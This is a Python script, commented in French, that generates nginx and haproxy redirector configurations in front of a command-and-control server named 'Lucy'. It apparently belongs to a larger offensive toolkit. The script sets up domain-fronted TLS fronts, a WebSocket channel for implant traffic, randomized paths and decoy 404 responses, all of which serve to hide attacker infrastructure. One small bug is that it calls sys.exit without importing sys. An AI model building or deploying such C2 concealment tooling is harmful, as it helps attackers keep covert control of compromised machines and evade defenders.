#!/usr/bin/env python3
"""
c2_mesh.py — C2-Mesh-Proxy (outil #41 du mapping Fifty).
Generation de configuration redirectors (nginx + haproxy) devant le C2 Lucy :
plusieurs fronts (SNI/domain fronting), TLS, upgrade WebSocket, rate limiting,
entetes X-Forwarded-For, chemins aleatoires optionnels.

Usage:
  python c2_mesh.py --c2 1.2.3.4:8000 --fronts cdn1.example.com,cdn2.example.com --out redirectors/
  python c2_mesh.py --c2 10.0.0.5:8000 --fronts edge.example.com --haproxy --random-paths
"""
import argparse
import json
import os
import secrets

WS_BLOCK = """    # Upgrade WebSocket (agent Lucy -> C2)
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
"""
LUCY_HEADERS = """    proxy_set_header Host $host;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_ssl_server_name on;
    proxy_connect_timeout 10s;
    proxy_read_timeout 3600s;
"""


def gen_nginx(c2: str, fronts: list[str], listen: int, cert: str, key: str,
              random_paths: bool, rate_limit: str | None) -> str:
    host, port = c2.split(":")
    lines = [
        "upstream lucy_c2 {",
        "    server %s:%s;" % (host, port),
        "}",
        "",
        "map $http_upgrade $connection_upgrade {",
        "    default upgrade;",
        "    '' close;",
        "}",
        "",
    ]
    if rate_limit:
        lines += ["limit_req_zone $binary_remote_addr zone=lucy_rl:10m rate=%s;" % rate_limit, ""]
    for f in fronts:
        lines += [
            "server {",
            "    listen %d ssl http2;" % listen,
            "    server_name %s;" % f,
            "    ssl_certificate     %s;" % cert,
            "    ssl_certificate_key %s;" % key,
            "    ssl_protocols TLSv1.2 TLSv1.3;",
            "    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';",
            "    ssl_prefer_server_ciphers on;",
            "",
        ]
        if rate_limit:
            lines += ["    limit_req zone=lucy_rl burst=20 nodelay;", ""]
        path = "/ws"
        if random_paths:
            path = "/" + secrets.token_urlsafe(6)
            lines.append("    # chemin aleatoire regenere a chaque build")
        lines += [
            "    location %s {" % path,
            "        proxy_pass http://lucy_c2;",
            WS_BLOCK,
            LUCY_HEADERS,
            "    }",
            "",
            "    location / {",
            "        return 404;",
            "    }",
            "}",
            "",
        ]
    return "\n".join(lines)


def gen_haproxy(c2: str, fronts: list[str], listen: int, cert: str) -> str:
    host, port = c2.split(":")
    lines = [
        "global",
        "    maxconn 4096",
        "    ssl-default-bind-ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384",
        "    ssl-default-bind-options no-sslv3 no-tlsv10 no-tlsv11",
        "",
        "defaults",
        "    mode http",
        "    timeout connect 10s",
        "    timeout client 1h",
        "    timeout server 1h",
        "    timeout tunnel 1h",
        "    option forwardfor",
        "",
        "frontend lucy_front",
        "    bind *:%d ssl crt %s" % (listen, cert),
        "    http-request set-header X-Forwarded-Proto https",
        "    acl is_ws hdr(Upgrade) -i websocket",
        "",
    ]
    for f in fronts:
        lines.append("    use_backend lucy_c2 if { ssl_fc_sni %s }" % f)
    lines += [
        "",
        "backend lucy_c2",
        "    server c2 %s:%s check" % (host, port),
        "    http-request set-header Host %s" % (fronts[0] if fronts else "localhost"),
        "",
    ]
    return "\n".join(lines)


def main(argv=None):
    p = argparse.ArgumentParser(description="C2-Mesh-Proxy Lucy (redirectors nginx/haproxy)")
    p.add_argument("--c2", required=True, help="adresse C2 HOST:PORT (ex: 1.2.3.4:8000)")
    p.add_argument("--fronts", required=True, help="fronts separes par des virgules")
    p.add_argument("--out", default="redirectors", help="dossier de sortie")
    p.add_argument("--listen", type=int, default=443, help="port d'ecoute redirector")
    p.add_argument("--tls-cert", default="/etc/ssl/lucy/fullchain.pem", help="certificat")
    p.add_argument("--tls-key", default="/etc/ssl/lucy/privkey.pem", help="cle privee")
    p.add_argument("--nginx", action="store_true", default=True, help="generer nginx")
    p.add_argument("--no-nginx", dest="nginx", action="store_false")
    p.add_argument("--haproxy", action="store_true", help="generer haproxy")
    p.add_argument("--random-paths", action="store_true", help="chemins aleatoires (nginx)")
    p.add_argument("--rate-limit", default=None, help="ex: 30r/s (nginx)")
    args = p.parse_args(argv)

    fronts = [f.strip() for f in args.fronts.split(",") if f.strip()]
    if not fronts:
        sys.exit("ERREUR: aucun front valide")
    os.makedirs(args.out, exist_ok=True)
    written = []

    if args.nginx:
        cfg = gen_nginx(args.c2, fronts, args.listen, args.tls_cert, args.tls_key,
                        args.random_paths, args.rate_limit)
        path = os.path.join(args.out, "lucy_redirector_nginx.conf")
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(cfg)
        written.append(path)

    if args.haproxy:
        cfg = gen_haproxy(args.c2, fronts, args.listen, args.tls_cert)
        path = os.path.join(args.out, "lucy_redirector_haproxy.cfg")
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(cfg)
        written.append(path)

    dns = os.path.join(args.out, "dns_setup.txt")
    with open(dns, "w", encoding="utf-8") as fh:
        fh.write("Point A/AAAA vers le redirector :\n")
        for f in fronts:
            fh.write("  %s -> <IP_REDIRECTOR>\n" % f)
        fh.write("\nC2: %s\nAgent: https://<front>/ws\n" % args.c2)
    written.append(dns)

    manifest = {"c2": args.c2, "fronts": fronts, "listen": args.listen,
                "files": written}
    mpath = os.path.join(args.out, "redirectors.json")
    with open(mpath, "w", encoding="utf-8") as fh:
        json.dump(manifest, fh, indent=2)
    print("c2_mesh:", json.dumps(manifest))
    return manifest


if __name__ == "__main__":
    main()
